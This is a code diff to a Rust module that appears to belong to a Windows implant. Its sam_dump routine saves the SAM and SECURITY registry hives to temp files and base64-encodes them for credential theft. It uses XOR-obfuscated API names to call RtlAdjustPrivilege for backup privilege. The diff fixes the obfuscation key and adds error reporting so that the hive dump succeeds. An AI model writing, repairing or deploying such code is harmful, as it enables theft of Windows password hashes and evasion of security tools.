@@ -166,13 +166,20 @@ fn sam_dump() -> TaskOutput {
         (b"SECURITY\0".as_ptr(), b"C:\\Windows\\Temp\\~s3.tmp\0".as_ptr()),
     ];
 
+    use windows_sys::Win32::Foundation::GetLastError;
     let mut results: Vec<(&str, Vec<u8>)> = Vec::new();
+    let mut first_err: u32 = 0;
     for (sub, tmp_path) in &hives {
         let mut hkey: isize = 0;
         let r = unsafe { fn_open(HKLM, *sub, REG_OPTION_BACKUP_RESTORE, KEY_READ, &mut hkey) };
-        if r != 0 || hkey == 0 { continue; }
-        unsafe { fn_save(hkey, *tmp_path, core::ptr::null(), 1 /* REG_LATEST_FORMAT */) };
+        if r != 0 || hkey == 0 {
+            if first_err == 0 { first_err = unsafe { GetLastError() }; }
+            continue;
+        }
+        let sr = unsafe { fn_save(hkey, *tmp_path, core::ptr::null(), 1 /* REG_LATEST_FORMAT */) };
+        let save_err = if sr != 0 { unsafe { GetLastError() } } else { 0 };
         unsafe { fn_close(hkey) };
+        let _ = save_err;
         let path_str = unsafe {
             let mut len = 0;
             while *tmp_path.add(len) != b'\0' { len += 1; }
@@ -190,7 +197,7 @@ fn sam_dump() -> TaskOutput {
     }
 
     if results.is_empty() {
-        return TaskOutput::failure("sam: no hives saved (need SeBackupPrivilege / admin)");
+        return TaskOutput::failure(&format!("sam: no hives saved (open_err={first_err})"));
     }
 
     use base64::Engine;
@@ -210,9 +217,9 @@ fn enable_backup_privilege() {
         crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
     );
     if ntdll == 0 { return; }
-    // "RtlAdjustPrivilege\0" XOR 0x5A
+    // "RtlAdjustPrivilege\0" encoded with KEY=0x5A (corrected — prior version used wrong key 0x11)
     let fn_ptr = unsafe { crate::loader::get_export_by_name(ntdll,
-        crate::obfs::dec(&[0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11]).as_ptr()
+        crate::obfs::dec(&[0x08,0x2E,0x36,0x1B,0x3E,0x30,0x2F,0x29,0x2E,0x0A,0x28,0x33,0x2C,0x33,0x36,0x3F,0x3D,0x3F,0x5A]).as_ptr()
     )};
     if let Some(p) = fn_ptr {
         type Fn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
